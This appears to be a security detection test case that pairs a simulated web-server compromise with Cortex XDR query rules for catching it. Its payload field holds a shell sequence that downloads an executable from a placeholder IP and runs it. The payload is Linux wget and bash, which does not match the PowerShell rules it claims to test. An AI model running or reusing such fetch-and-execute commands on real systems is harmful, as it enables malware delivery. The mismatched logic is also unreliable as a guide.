identity.name: Web Server CGO Executes Uncommon Process via PowerShell
identity.summary: A web server running as a CGI process executes an uncommon PowerShell command to download and execute a payload from a remote C2 server. Cortex should detect the anomalous process execution and networ
identity.description: A web server running as a CGI process executes an uncommon PowerShell command to download and execute a payload from a remote C2 server. Cortex should detect the anomalous process execution and network connection.

payload.code:
cd /tmp
wget http://192.0.2.50/malware.exe -O malware.exe
chmod +x malware.exe
./malware.exe

expected_artifacts.description: PowerShell process started with suspicious command line arguments
Outbound connection to C2 IP address

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon PowerShell Execution from Web Server
biocs.description: Detection of PowerShell process started by a web server process (w3wp.exe)
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'w3wp.exe' and action_process_image_name = 'powershell.exe'
| filter action_process_command_line contains 'powershell.exe' and action_process_command_line contains '-EncodedCommand'

abiocs.name: CGO Web Server Executes PowerShell with Encoded Command
abiocs.description: Behavioral deviation where a web server process spawns PowerShell with encoded command line arguments
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'w3wp.exe' and action_process_image_name = 'powershell.exe'
| filter action_process_command_line contains '-EncodedCommand' and action_process_command_line contains 'http://192.0.2.50'

xql_queries.name: Detect PowerShell from Web Server
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
